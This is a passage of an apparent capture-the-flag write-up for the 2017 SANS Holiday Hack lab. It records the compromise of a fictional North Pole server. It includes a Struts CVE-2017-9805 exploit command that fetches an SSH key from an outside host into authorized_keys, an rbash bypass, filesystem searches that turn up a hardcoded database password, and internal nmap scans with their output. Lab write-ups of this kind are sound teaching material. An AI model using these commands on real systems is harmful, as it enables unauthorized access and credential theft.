<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="org827866e"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="org8430dcd"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="org6c3e74b"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="org0bfc00b"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org2c7943b"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="org8caa9a2"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org2a30f35" class="outline-2">
<h2 id="org2a30f35">Misc/TODO</h2>
<div class="outline-text-2" id="text-org2a30f35">
<p>
Need to add this content elsewhere
</p>
</div>
<div id="outline-container-org735e341" class="outline-3">
<h3 id="org735e341">Let the Hack Begin!</h3>
<div class="outline-text-3" id="text-org735e341">
</div>
<div id="outline-container-org2ff1529" class="outline-4">
<h4 id="org2ff1529">Gaining Access to L2S</h4>
<div class="outline-text-4" id="text-org2ff1529">
<p>
The SAN cert showed it the was the same as dev.northpolechristmastown.com.
</p>

<p>
TODO: Justin - how did you figure out it was Struts?
</p>

<p>
Used the Python tool in the SANS blog post:
</p>

<div class="org-src-container">
<pre class="src src-sh">python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c <span style="color: #8abeb7;">'mkdir /home/alabaster_snowball/.ssh; cd /home/alabaster_snowball/.ssh; wget http://1.2.3.4/a.key -O authorized_keys; chmod 600 authorized_keys; chmod 700 .'</span>
</pre>
</div>
</div>

<ul class="org-ul">
<li><a id="org077748d"></a>Finding the password for alabaster_snowball<br />
<div class="outline-text-5" id="text-org077748d">
<p>
Login using ssh, but explicitly run bash, bypassing the rbash restriction
</p>

<div class="org-src-container">
<pre class="src src-sh">$ ssh alabaster_snowball@dev.northpolechristmastown.com -t bash
</pre>
</div>

<p>
First, fix the shells path.  We can grab what a normal path looks like from /etc/profile:
</p>

<div class="org-src-container">
<pre class="src src-sh">alabaster_snowball@l2s:~$ grep PATH /etc/profile
  <span style="color: #f0c674;">PATH</span>=<span style="color: #8abeb7;">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
  <span style="color: #f0c674;">PATH</span>=<span style="color: #8abeb7;">"/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"</span>
<span style="color: #b294bb;">export</span> PATH
alabaster_snowball@l2s:~$ <span style="color: #f0c674;">PATH</span>=<span style="color: #8abeb7;">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
</pre>
</div>

<p>
Find all small files owned by alabaster_snowball on the main filesystem and search them for the string password.
Start small and double the filesize each time to keep the process fast.
</p>

<div class="org-src-container">
<pre class="src src-sh">alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -1k 2&gt;/dev/null |xargs grep passwor
alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -2k 2&gt;/dev/null |xargs grep passwor
alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -4k 2&gt;/dev/null |xargs grep passwor
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String password = <span style="color: #8abeb7;">"stream_unhappy_buy_loss"</span>;
</pre>
</div>

<p>
We could have also searched for the username to find intersting files:
</p>

<div class="org-src-container">
<pre class="src src-sh">$ time grep alabaster_snowball -r /opt/
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = <span style="color: #8abeb7;">"alabaster_snowball"</span>;

real    0m0.355s
user    0m0.300s
sys     0m0.052s
</pre>
</div>
</div>
</li>
</ul>
</div>
</div>

<div id="outline-container-org1d65fe1" class="outline-3">
<h3 id="org1d65fe1">Using ripgrep</h3>
<div class="outline-text-3" id="text-org1d65fe1">
<p>
Ripgrep is a super fast grep replacement written in rust.
It does a better job at filtering binary files, so we can run this command that finishes in about a second:
</p>

<div class="org-src-container">
<pre class="src src-sh">$ mkdir /tmp/.rg
$ cd /tmp/.rg
$ wget https://github.com/BurntSushi/ripgrep/releases/download/0.7.1/ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz
$ tar xvzf ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz
$ find / -type f -xdev -user alabaster_snowball 2&gt;/dev/null | xargs ./ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster -A 1
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
3:            final String username = <span style="color: #8abeb7;">"alabaster_snowball"</span>;
4-            final String password = <span style="color: #8abeb7;">"stream_unhappy_buy_loss"</span>;
</pre>
</div>

<p>
If we didn't think to only look in our files, it only takes 4 seconds to search
the entire filesystem.  After ignoring proc and some debian package info, only
a few lines are output.
</p>

<div class="org-src-container">
<pre class="src src-sh">$ time ./ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster / --no-messages |grep -v /proc|grep -v deb.debian.org
/etc/crontab:#@reboot root /usr/bin/nohup /usr/bin/sudo -u alabaster_snowball /opt/apache-tomcat/start_tomcat.sh &amp;
/etc/subuid:alabaster_snowball:296608:65536
/etc/passwd:alabaster_snowball:x:1003:1004:Alabaster Snowball,,,:/home/alabaster_snowball:/bin/rbash
/etc/group:alabaster_snowball:x:1004:
/etc/subgid:alabaster_snowball:296608:65536
/etc/systemd/system/tomcat.service:<span style="color: #f0c674;">User</span>=alabaster_snowball
/etc/systemd/system/tomcat.service:<span style="color: #f0c674;">Group</span>=alabaster_snowball
/usr/share/dh-python/dist/cpython3_fallback:alabaster python3-alabaster
/usr/share/dh-python/dist/cpython2_fallback:alabaster python-alabaster
/usr/lib/google-cloud-sdk/platform/gsutil/third_party/pyasn1/doc/source/conf.py:# html_theme = <span style="color: #8abeb7;">'alabaster'</span>
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = <span style="color: #8abeb7;">"alabaster_snowball"</span>;

real    0m4.095s
user    0m1.864s
sys     0m18.808s
</pre>
</div>

<p>
Basic hostname enumeration:
</p>

<pre class="example">
$ nmap -sL 10.142.0.*|fgrep '('
Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-18 02:20 UTC
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
Nmap done: 256 IP addresses (0 hosts up) scanned in 0.01 seconds
</pre>

<p>
Even without scanning any ports, we can guess what hhc17-smb-server does!
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh l2s | tee nmap.out
</pre>
</div>

<pre class="example">
Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-15 02:26 UTC
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Host is up (0.00020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open  http     nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.10.3
|_http-title: Did not follow redirect to https://hhc17-l2s-proxy.c.holidayhack2017.internal/
443/tcp  open  ssl/http nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3
|_http-title: Toys List
| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Issuer: commonName=Let's Encrypt Authority X3/organizationName=Let's Encrypt/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-11-29T12:54:54
| Not valid after:  2018-02-27T12:54:54
| MD5:   90b5 5b73 6e21 e00f 0247 b22d a1ec f953
|_SHA-1: c089 30bf cd61 3a55 ea8f f419 2542 b9b4 9823 8fb1
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
2222/tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Host is up (0.00017s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp open  http    nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3
|_http-title: Toys List
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Host is up (0.00021s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ac:cc:7c:b1:cb:56:0b:bc:cd:05:12:36:e7:24:ca (RSA)
|_  256 9f:4e:9a:ee:dc:ef:f4:4b:6d:1b:03:58:bb:5d:a2:87 (ECDSA)
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp   open  http    nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/cookie.txt
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
143/tcp  open  imap    Dovecot imapd
|_imap-capabilities: OK ID IDLE LITERAL+ AUTH=PLAIN more have capabilities listed post-login LOGIN-REFERRALS Pre-login AUTH=LOGINA0001 ENABLE SASL-IR IMAP4rev1
2525/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
3000/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/cookie.txt
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: Host:  mail.northpolechristmastown.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Host is up (0.00017s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 33:fb:b7:35:b5:7a:72:6f:06:91:21:ff:e2:3e:86:79 (RSA)
|_  256 70:71:ea:71:cd:83:d8:47:29:ef:6f:69:f3:8a:ed:a2 (ECDSA)
80/tcp   open  http    nginx 1.10.3
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| http-robots.txt: 1 disallowed entry 
|_/dev
|_http-server-header: nginx/1.10.3
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://edb.northpolechristmastown.com/index.html
389/tcp  open  ldap
| fingerprint-strings: 
|   LDAPBindReq: 
|     Version 2 not supported
|   LDAPSearchReq: 
|     supportedLDAPVersion1
|     namingContexts1
|     dc=com0/
|     supportedExtension1
|_    1.3.6.1.4.1.4203.1.11.10
8080/tcp open  http    Werkzeug httpd 0.12.2 (Python 2.7.13)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| http-robots.txt: 1 disallowed entry 
|_/dev
|_http-server-header: Werkzeug/0.12.2 Python/2.7.13
|_http-title: Did not follow redirect to http://edb.northpolechristmastown.com/index.html
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port389-TCP:V=7.40%I=7%D=12/15%Time=5A3332D9%P=x86_64-pc-linux-gnu%r(LD
SF:APSearchReq,83,"0s\x02\x01\x07dn\x04\x000j0\x1b\x04\x14supportedLDAPVer
SF:sion1\x03\x04\x0130\x1a\x04\x0enamingContexts1\x08\x04\x06dc=com0/\x04\
SF:x12supportedExtension1\x19\x04\x171\.3\.6\.1\.4\.1\.4203\.1\.11\.10\x0c
SF:\x02\x01\x07e\x07\n\x01\0\x04\0\x04\0")%r(LDAPBindReq,25,"0#\x02\x01\x0
SF:1a\x1e\n\x01\x02\x04\0\x04\x17Version\x202\x20not\x20supported");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
Host is up (0.00081s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-smb-server
| Issuer: commonName=hhc17-smb-server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-11-06T13:46:55
| Not valid after:  2018-05-08T13:46:55
| MD5:   092f 018a 083a b87a 8186 ecac da4e 09e2
|_SHA-1: 0a0d f4e6 765f 1818 cd32 4bf2 5212 e8ca ef51 5c38
|_ssl-date: 2017-12-15T02:27:40+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Host is up (0.00014s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp open  http    nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3
|_http-title: Toys List
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
Host is up (0.00089s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Index - North Pole Engineering Presents: EaaS!
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-elf-manufacturing
| Issuer: commonName=hhc17-elf-manufacturing
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-11-23T20:53:55
| Not valid after:  2018-05-25T20:53:55
| MD5:   a711 f240 0c9e a8cd 3be4 81fa fa16 f15a
|_SHA-1: 5728 6c5d 2ec0 6657 629b f9f4 72aa 0b3d 12d4 b3a5
|_ssl-date: 2017-12-15T02:27:40+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 02:27
Completed NSE at 02:27, 0.00s elapsed
Initiating NSE at 02:27
Completed NSE at 02:27, 0.00s elapsed
Post-scan script results:
| clock-skew: 
|   0s: 
|     10.142.0.13 (eaas.northpolechristmastown.com)
|_    10.142.0.8 (hhc17-emi.c.holidayhack2017.internal)
| ssh-hostkey: Possible duplicate hosts
| Key 2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA) used by:
|   10.142.0.2
|   10.142.0.3
|   10.142.0.11
| Key 256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA) used by:
|   10.142.0.2
|   10.142.0.3
|_  10.142.0.11
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (7 hosts up) scanned in 86.82 seconds
</pre>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="author">Author: Vlad Grigorescu</p>
<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
